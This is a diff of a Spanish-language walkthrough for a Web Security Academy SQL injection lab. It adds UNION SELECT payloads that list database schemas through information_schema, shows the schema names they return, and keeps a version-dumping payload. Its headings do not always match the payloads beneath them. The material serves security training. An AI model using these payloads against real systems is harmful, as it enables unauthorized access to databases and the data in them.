@@ -17,15 +17,21 @@ To solve the lab, log in as the `administrator` user.
 
 ### Explicación:
 
+- Muy similar a los laboratorios anteriores enfocados a diferentes RDBMS
+- En este caso es llegar hasta el login con `adminsitrador`
+
 
 
 
 ## Solución:
 
 ````py
-## SQLi: Dumpear Version opt.1
-.web-security-academy.net/filter?category=Pets' Union Select 1,version() -- -
+## Dumpear la base de Datos:
+.web-security-academy.net/filter?category=-Pets'  Union Select '1',schema_name FROM information_schema.schemata -- -
+    #	information_schema
+    #	public
+    #	pg_catalog
 
-## SQLi: Dumpear Version opt.1
+## Dumpear el Nombre de las Tablas:
 .web-security-academy.net/filter?category=Pets' Union Select 1,@@version -- -
 ````
